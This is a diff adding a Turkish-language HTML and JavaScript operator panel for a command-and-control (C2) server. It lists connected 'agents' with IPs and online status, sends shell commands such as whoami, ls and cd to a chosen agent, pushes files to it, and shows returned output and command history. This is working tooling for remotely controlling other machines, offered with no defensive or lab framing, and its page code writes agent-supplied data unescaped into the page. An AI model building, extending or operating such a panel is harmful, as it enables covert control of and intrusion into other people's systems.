@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Sunucu - Yönetim Paneli</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #0a0e1c;
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: #14182b;
+            padding: 20px 30px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #2a2f45;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .header h1 {
+            color: #00ff9d;
+            font-size: 24px;
+            font-weight: 300;
+            letter-spacing: 2px;
+        }
+        
+        .header .stats {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #00ff9d;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+        }
+        
+        .nav {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            background: #1e2338;
+            transition: all 0.3s;
+        }
+        
+        .nav a:hover {
+            background: #00ff9d;
+            color: #0a0e1c;
+        }
+        
+        .nav a.active {
+            background: #00ff9d;
+            color: #0a0e1c;
+        }
+        
+        .main-panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .panel {
+            background: #14182b;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #2a2f45;
+        }
+        
+        .panel h2 {
+            color: #00ff9d;
+            margin-bottom: 20px;
+            font-size: 18px;
+            border-bottom: 1px solid #2a2f45;
+            padding-bottom: 10px;
+            font-weight: 300;
+        }
+        
+        /* Scroll'lu ajan listesi */
+        .agents-container {
+            max-height: 400px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: #00ff9d #1e2338;
+        }
+        
+        .agents-container::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .agents-container::-webkit-scrollbar-track {
+            background: #1e2338;
+            border-radius: 4px;
+        }
+        
+        .agents-container::-webkit-scrollbar-thumb {
+            background: #00ff9d;
+            border-radius: 4px;
+        }
+        
+        .agents-container::-webkit-scrollbar-thumb:hover {
+            background: #00cc7a;
+        }
+        
+        .agents-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .agents-table th {
+            text-align: left;
+            padding: 12px;
+            background: #1e2338;
+            color: #00ff9d;
+            font-weight: 500;
+            font-size: 14px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        
+        .agents-table td {
+            padding: 12px;
+            border-bottom: 1px solid #2a2f45;
+            font-size: 14px;
+        }
+        
+        .agents-table tr:hover {
+            background: #1e2338;
+        }
+        
+        .online-badge {
+            background: #00ff9d;
+            color: #0a0e1c;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .offline-badge {
+            background: #ff4d4d;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .pending-badge {
+            background: #ffaa00;
+            color: #0a0e1c;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .connections-list {
+            max-height: 400px;
+            overflow-y: auto;
+            scrollbar-width: thin;
+            scrollbar-color: #00ff9d #1e2338;
+        }
+        
+        .connections-list::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .connections-list::-webkit-scrollbar-track {
+            background: #1e2338;
+            border-radius: 4px;
+        }
+        
+        .connections-list::-webkit-scrollbar-thumb {
+            background: #00ff9d;
+            border-radius: 4px;
+        }
+        
+        .connection-item {
+            padding: 10px;
+            border-bottom: 1px solid #2a2f45;
+            font-size: 13px;
+        }
+        
+        .connection-item .ip {
+            font-weight: 600;
+            color: #00ff9d;
+        }
+        
+        .connection-item .time {
+            color: #888;
+            font-size: 11px;
+            margin-left: 10px;
+        }
+        
+        .agent-detail-panel {
+            background: #14182b;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #2a2f45;
+            margin-bottom: 20px;
+        }
+        
+        .agent-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #2a2f45;
+        }
+        
+        .agent-id {
+            color: #00ff9d;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        
+        .agent-info {
+            color: #888;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+        
+        .command-input {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .command-input input {
+            flex: 1;
+            padding: 12px;
+            background: #0a0e1c;
+            border: 2px solid #2a2f45;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+        }
+        
+        .command-input input:focus {
+            border-color: #00ff9d;
+            outline: none;
+        }
+        
+        .command-input button {
+            padding: 12px 24px;
+            background: #00ff9d;
+            color: #0a0e1c;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .command-input button:hover {
+            background: #00cc7a;
+            box-shadow: 0 0 15px #00ff9d;
+        }
+        
+        .command-input button:disabled {
+            background: #444;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .file-upload {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+            padding: 20px;
+            background: #1e2338;
+            border-radius: 5px;
+            border-left: 3px solid #00ff9d;
+        }
+        
+        .file-upload input[type="file"] {
+            flex: 1;
+            color: #fff;
+        }
+        
+        .file-upload button {
+            padding: 8px 16px;
+            background: #ffaa00;
+            color: #0a0e1c;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .command-info {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 10px;
+            background: #1e2338;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            border-left: 3px solid #00ff9d;
+        }
+        
+        .command-info-label {
+            color: #00ff9d;
+            font-weight: 500;
+        }
+        
+        .command-info-value {
+            color: #fff;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .output-box {
+            background: #0a0e1c;
+            border: 1px solid #2a2f45;
+            border-radius: 5px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #00ff9d;
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-bottom: 20px;
+        }
+        
+        .results-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        .results-table th {
+            text-align: left;
+            padding: 10px;
+            background: #1e2338;
+            color: #00ff9d;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .results-table td {
+            padding: 10px;
+            border-bottom: 1px solid #2a2f45;
+            font-size: 13px;
+        }
+        
+        .results-table tr {
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .results-table tr:hover {
+            background: #1e2338;
+        }
+        
+        .results-table tr.selected {
+            background: #2a2f45;
+            border-left: 3px solid #00ff9d;
+        }
+        
+        .command-output-cell {
+            max-width: 300px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            color: #888;
+        }
+        
+        .logout {
+            text-align: right;
+            margin-top: 20px;
+        }
+        
+        .logout a {
+            color: #888;
+            text-decoration: none;
+            padding: 8px 16px;
+            border: 1px solid #2a2f45;
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+        
+        .logout a:hover {
+            color: #ff4d4d;
+            border-color: #ff4d4d;
+        }
+        
+        .no-agents {
+            text-align: center;
+            padding: 40px;
+            color: #888;
+            font-style: italic;
+        }
+        
+        .timestamp {
+            color: #888;
+            font-size: 11px;
+        }
+        
+        .selected-row {
+            background: #1e2338 !important;
+            border-left: 3px solid #00ff9d;
+        }
+        
+        @media (max-width: 1200px) {
+            .main-panel {
+                grid-template-columns: 1fr;
+            }
+            
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .header .stats {
+                width: 100%;
+                justify-content: space-between;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 C2 KOMUT KONTROL PANELİ</h1>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="totalAgents">0</div>
+                    <div class="stat-label">Toplam Ajan</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="onlineAgents">0</div>
+                    <div class="stat-label">Aktif Ajan</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="totalConnections">0</div>
+                    <div class="stat-label">Bağlantı</div>
+                </div>
+            </div>
+            <div class="nav">
+                <a href="/dashboard" class="active">AJANLAR</a>
+                <a href="/files">DOSYALAR</a>
+            </div>
+        </div>
+        
+        <div class="main-panel">
+            <div class="panel">
+                <h2>👥 BAĞLI AJANLAR</h2>
+                <div class="agents-container">
+                    <table class="agents-table">
+                        <thead>
+                            <tr>
+                                <th>İSİM</th>
+                                <th>IP</th>
+                                <th>SON GÖRÜLME</th>
+                                <th>DURUM</th>
+                                <th>KOMUT</th>
+                                <th>DOSYA</th>
+                                <th></th>
+                            </tr>
+                        </thead>
+                        <tbody id="agentsList">
+                            <tr>
+                                <td colspan="7" class="no-agents">Ajan bekleniyor...</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="panel">
+                <h2>🔌 SON BAĞLANTILAR</h2>
+                <div class="connections-list" id="connectionsList">
+                    <div class="no-agents">Bağlantı bekleniyor...</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="agent-detail-panel" id="agentDetailPanel">
+            <div class="agent-header">
+                <div>
+                    <span class="agent-id" id="selectedAgentId">👤 AJAN SEÇİLMEDİ</span>
+                    <span class="agent-info" id="selectedAgentInfo"></span>
+                </div>
+                <span id="agentStatus"></span>
+            </div>
+            
+            <div class="command-input">
+                <input type="text" id="commandInput" placeholder="Komut girin (whoami, ip addr, ls, pwd, upload <dosya>, cd <dizin>, etc...)" />
+                <button onclick="sendCommand()" id="sendButton" disabled>KOMUT GÖNDER</button>
+            </div>
+            
+            <div class="file-upload" id="fileUploadSection" style="display: none;">
+                <input type="file" id="fileInput">
+                <button onclick="sendFile()" id="sendFileButton">DOSYA GÖNDER</button>
+            </div>
+            
+            <div id="lastCommandInfo" style="display: none;" class="command-info">
+                <div class="command-info-label">Son Komut:</div>
+                <div class="command-info-value" id="lastCommandText"></div>
+                <div class="command-info-label">Gönderilme:</div>
+                <div class="command-info-value" id="lastCommandTime"></div>
+                <div class="command-info-label">Durum:</div>
+                <div class="command-info-value" id="lastCommandStatus"></div>
+            </div>
+            
+            <h3 style="color: #00ff9d; margin: 10px 0;">📤 KOMUT ÇIKTISI:</h3>
+            <div class="output-box" id="commandOutput">
+                > Ajan seçin ve komut gönderin...
+            </div>
+            
+            <h3 style="color: #00ff9d; margin: 20px 0 10px 0;">📋 GEÇMİŞ KOMUTLAR</h3>
+            <table class="results-table" id="resultsTable">
+                <thead>
+                    <tr>
+                        <th>ZAMAN</th>
+                        <th>KOMUT</th>
+                        <th>ÇIKTI (Önizleme)</th>
+                    </tr>
+                </thead>
+                <tbody id="resultsList">
+                    <tr>
+                        <td colspan="3" class="no-agents">Henüz komut yok</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="logout">
+            <a href="/logout">🔴 ÇIKIŞ YAP</a>
+        </div>
+    </div>
+
+    <script>
+        // Seçili ajan ve komutlar
+        let selectedAgent = null;
+        let agents = [];
+        let commandResults = [];
+        let selectedCommandId = null;
+        
+        // Canlı bağlantı (EventSource)
+        let eventSource = null;
+        
+        function initEventSource() {
+            if (eventSource) {
+                eventSource.close();
+            }
+            
+            eventSource = new EventSource('/api/live/updates');
+            
+            eventSource.onmessage = function(event) {
+                try {
+                    const data = JSON.parse(event.data);
+                    updateUI(data);
+                } catch (e) {
+                    console.error('EventSource veri hatası:', e);
+                }
+            };
+            
+            eventSource.onerror = function(error) {
+                console.log('EventSource bağlantı hatası, 3 saniye sonra yeniden bağlanılacak...');
+                eventSource.close();
+                setTimeout(initEventSource, 3000);
+            };
+            
+            eventSource.onopen = function() {
+                console.log('EventSource bağlantısı kuruldu');
+            };
+        }
+        
+        function updateUI(data) {
+            // Sadece sayıları ve listeleri güncelle, sayfayı yenileme!
+            document.getElementById('totalAgents').textContent = data.totalCount || 0;
+            document.getElementById('onlineAgents').textContent = data.onlineCount || 0;
+            
+            // Ajan listesini güncelle
+            agents = data.agents || [];
+            renderAgentsList();
+            
+            // Son bağlantıları güncelle
+            const connectionsList = document.getElementById('connectionsList');
+            if (!data.lastConnections || data.lastConnections.length === 0) {
+                connectionsList.innerHTML = '<div class="no-agents">Bağlantı yok</div>';
+            } else {
+                connectionsList.innerHTML = data.lastConnections.map(conn => {
+                    const time = new Date(conn.timestamp).toLocaleTimeString('tr-TR');
+                    return `
+                        <div class="connection-item">
+                            <span class="ip">${conn.ip}</span>
+                            <span class="time">${time}</span>
+                            <div style="font-size: 11px; color: #888; margin-top: 4px;">${conn.method} ${conn.url}</div>
+                        </div>
+                    `;
+                }).join('');
+            }
+        }
+        
+        function renderAgentsList() {
+            const agentsList = document.getElementById('agentsList');
+            
+            if (agents.length === 0) {
+                agentsList.innerHTML = '<tr><td colspan="7" class="no-agents">Ajan yok</td></tr>';
+                return;
+            }
+            
+            // Seçili ajanı en üste getir
+            let sortedAgents = [...agents];
+            if (selectedAgent) {
+                const selectedIndex = sortedAgents.findIndex(a => a.id === selectedAgent);
+                if (selectedIndex > -1) {
+                    const selected = sortedAgents.splice(selectedIndex, 1)[0];
+                    sortedAgents.unshift(selected);
+                }
+            }
+            
+            agentsList.innerHTML = sortedAgents.map(agent => {
+                const isSelected = selectedAgent === agent.id;
+                const lastSeen = new Date(agent.lastSeen).toLocaleTimeString('tr-TR');
+                return `
+                    <tr class="${isSelected ? 'selected-row' : ''}">
+                        <td>${agent.name || agent.id.substring(0, 15)}</td>
+                        <td>${agent.ip || '?'}</td>
+                        <td>${lastSeen}</td>
+                        <td><span class="${agent.status === 'online' ? 'online-badge' : 'offline-badge'}">${agent.status === 'online' ? 'AKTİF' : 'KAPALI'}</span></td>
+                        <td>${agent.hasPendingCommand ? '<span class="pending-badge">BEKLEYEN KOMUT</span>' : '-'}</td>
+                        <td>${agent.hasPendingFile ? '<span class="pending-badge">BEKLEYEN DOSYA</span>' : '-'}</td>
+                        <td><button onclick="selectAgent('${agent.id}')" style="background: #00ff9d; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; color: #0a0e1c; font-weight: 600;">SEÇ</button></td>
+                    </tr>
+                `;
+            }).join('');
+            
+            // Seçili ajan varsa scroll'u ona kaydır (ama sayfayı yeniden yükleme)
+            if (selectedAgent) {
+                const selectedRow = document.querySelector('.selected-row');
+                if (selectedRow) {
+                    // Sadece eğer görünür değilse scroll yap
+                    const rect = selectedRow.getBoundingClientRect();
+                    const container = document.querySelector('.agents-container');
+                    const containerRect = container.getBoundingClientRect();
+                    
+                    if (rect.bottom > containerRect.bottom || rect.top < containerRect.top) {
+                        selectedRow.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                    }
+                }
+            }
+        }
+        
+        function selectAgent(agentId) {
+            selectedAgent = agentId;
+            
+            const agent = agents.find(a => a.id === agentId);
+            
+            if (agent) {
+                document.getElementById('selectedAgentId').textContent = `👤 ${agent.name || agent.id}`;
+                document.getElementById('selectedAgentInfo').textContent = ` | IP: ${agent.ip} | Son görülme: ${new Date(agent.lastSeen).toLocaleString('tr-TR')}`;
+                document.getElementById('agentStatus').innerHTML = `<span class="${agent.status === 'online' ? 'online-badge' : 'offline-badge'}">${agent.status === 'online' ? 'AKTİF' : 'KAPALI'}</span>`;
+                
+                const isOnline = agent.status === 'online';
+                document.getElementById('sendButton').disabled = !isOnline;
+                document.getElementById('fileUploadSection').style.display = isOnline ? 'flex' : 'none';
+                
+                document.getElementById('commandOutput').innerHTML = '> Ajan seçildi. Komut gönderebilirsiniz.';
+                document.getElementById('lastCommandInfo').style.display = 'none';
+                
+                fetchAgentResults(agentId);
+            }
+            
+            renderAgentsList();
+        }
+        
+        function fetchAgentResults(agentId) {
+            fetch(`/api/agents/${agentId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        commandResults = data.commandResults || [];
+                        updateResultsTable(commandResults);
+                        
+                        if (commandResults.length > 0) {
+                            const sortedResults = [...commandResults].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                            const latestResult = sortedResults[0];
+                            showCommandOutput(latestResult.command_id || latestResult.timestamp, latestResult);
+                        }
+                    }
+                })
+                .catch(error => console.error('Sonuçlar alınamadı:', error));
+        }
+        
+        function updateResultsTable(results) {
+            const resultsList = document.getElementById('resultsList');
+            
+            if (!results || results.length === 0) {
+                resultsList.innerHTML = '<tr><td colspan="3" class="no-agents">Henüz komut sonucu yok</td></tr>';
+                return;
+            }
+            
+            const sortedResults = [...results].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            resultsList.innerHTML = sortedResults.map(result => {
+                const time = new Date(result.timestamp).toLocaleString('tr-TR');
+                const outputPreview = (result.output || '').substring(0, 50) + (result.output && result.output.length > 50 ? '...' : '');
+                const isSelected = selectedCommandId === (result.command_id || result.timestamp);
+                
+                // Escape JSON for onclick
+                const resultStr = JSON.stringify(result).replace(/"/g, '&quot;');
+                
+                return `
+                    <tr class="${isSelected ? 'selected' : ''}" onclick="showCommandOutput('${result.command_id || result.timestamp}', ${resultStr})">
+                        <td class="timestamp">${time}</td>
+                        <td><span style="color: #00ff9d;">${result.command || '?'}</span></td>
+                        <td class="command-output-cell" title="${(result.output || '').replace(/"/g, '&quot;')}">${outputPreview || 'Çıktı yok'}</td>
+                    </tr>
+                `;
+            }).join('');
+        }
+        
+        function showCommandOutput(commandId, result) {
+            selectedCommandId = commandId;
+            
+            document.getElementById('lastCommandInfo').style.display = 'grid';
+            document.getElementById('lastCommandText').textContent = result.command || '?';
+            document.getElementById('lastCommandTime').textContent = new Date(result.timestamp).toLocaleString('tr-TR');
+            document.getElementById('lastCommandStatus').textContent = 'Tamamlandı';
+            document.getElementById('commandOutput').innerHTML = (result.output || 'Çıktı yok').replace(/\n/g, '<br>');
+            
+            updateResultsTable(commandResults);
+        }
+        
+        function sendCommand() {
+            if (!selectedAgent) {
+                alert('Önce bir ajan seçin!');
+                return;
+            }
+            
+            const command = document.getElementById('commandInput').value.trim();
+            if (!command) {
+                alert('Komut girin!');
+                return;
+            }
+            
+            const sendButton = document.getElementById('sendButton');
+            sendButton.disabled = true;
+            sendButton.textContent = 'GÖNDERİLİYOR...';
+            
+            document.getElementById('lastCommandInfo').style.display = 'grid';
+            document.getElementById('lastCommandText').textContent = command;
+            document.getElementById('lastCommandTime').textContent = new Date().toLocaleString('tr-TR');
+            document.getElementById('lastCommandStatus').textContent = 'Gönderildi, çalıştırılıyor...';
+            document.getElementById('commandOutput').innerHTML = `> Komut gönderildi: ${command}\n> Çalıştırılıyor...`;
+            
+            fetch(`/api/agents/${selectedAgent}/command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('commandOutput').innerHTML += `\n> Komut ID: ${data.commandId}`;
+                    document.getElementById('commandInput').value = '';
+                    
+                    setTimeout(() => {
+                        if (selectedAgent) fetchAgentResults(selectedAgent);
+                    }, 2000);
+                } else {
+                    document.getElementById('commandOutput').innerHTML = `> HATA: ${data.error || 'Komut gönderilemedi'}`;
+                    document.getElementById('lastCommandStatus').textContent = 'HATA';
+                }
+            })
+            .catch(error => {
+                document.getElementById('commandOutput').innerHTML = `> BAĞLANTI HATASI: ${error}`;
+                document.getElementById('lastCommandStatus').textContent = 'BAĞLANTI HATASI';
+            })
+            .finally(() => {
+                sendButton.disabled = false;
+                sendButton.textContent = 'KOMUT GÖNDER';
+            });
+        }
+        
+        function sendFile() {
+            if (!selectedAgent) {
+                alert('Önce bir ajan seçin!');
+                return;
+            }
+            
+            const fileInput = document.getElementById('fileInput');
+            if (!fileInput.files || fileInput.files.length === 0) {
+                alert('Dosya seçin!');
+                return;
+            }
+            
+            const file = fileInput.files[0];
+            const formData = new FormData();
+            formData.append('file', file);
+            
+            const sendButton = document.getElementById('sendFileButton');
+            sendButton.disabled = true;
+            sendButton.textContent = 'GÖNDERİLİYOR...';
+            
+            document.getElementById('commandOutput').innerHTML = `> Dosya gönderiliyor: ${file.name} (${file.size} bytes)`;
+            
+            fetch(`/api/agents/${selectedAgent}/send-file`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('commandOutput').innerHTML = `> Dosya gönderildi: ${data.fileName}\n> Dosya ID: ${data.fileId}\n> Ajan dosyayı alacak...`;
+                    fileInput.value = '';
+                } else {
+                    document.getElementById('commandOutput').innerHTML = `> HATA: ${data.error || 'Dosya gönderilemedi'}`;
+                }
+            })
+            .catch(error => {
+                document.getElementById('commandOutput').innerHTML = `> BAĞLANTI HATASI: ${error}`;
+            })
+            .finally(() => {
+                sendButton.disabled = false;
+                sendButton.textContent = 'DOSYA GÖNDER';
+            });
+        }
+        
+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && selectedAgent) sendCommand();
+        });
+        
+        // Sayfa yüklendiğinde
+        window.onload = function() {
+            // EventSource'u başlat
+            initEventSource();
+            
+            // İlk verileri yükle
+            fetch('/api/agents')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        document.getElementById('totalAgents').textContent = data.total || 0;
+                        document.getElementById('onlineAgents').textContent = data.stats?.onlineAgents || 0;
+                        document.getElementById('totalConnections').textContent = data.stats?.totalConnections || 0;
+                        
+                        agents = data.agents || [];
+                        renderAgentsList();
+                        
+                        const connectionsList = document.getElementById('connectionsList');
+                        if (data.connections && data.connections.length > 0) {
+                            connectionsList.innerHTML = data.connections.map(conn => {
+                                const time = new Date(conn.timestamp).toLocaleTimeString('tr-TR');
+                                return `
+                                    <div class="connection-item">
+                                        <span class="ip">${conn.ip}</span>
+                                        <span class="time">${time}</span>
+                                        <div style="font-size: 11px; color: #888; margin-top: 4px;">${conn.method} ${conn.url}</div>
+                                    </div>
+                                `;
+                            }).join('');
+                        }
+                    }
+                })
+                .catch(error => console.error('Ajanlar alınamadı:', error));
+        };
+        
+        // Sayfa kapanırken EventSource'u temizle
+        window.onbeforeunload = function() {
+            if (eventSource) {
+                eventSource.close();
+            }
+        };
+    </script>
+</body>
+</html>
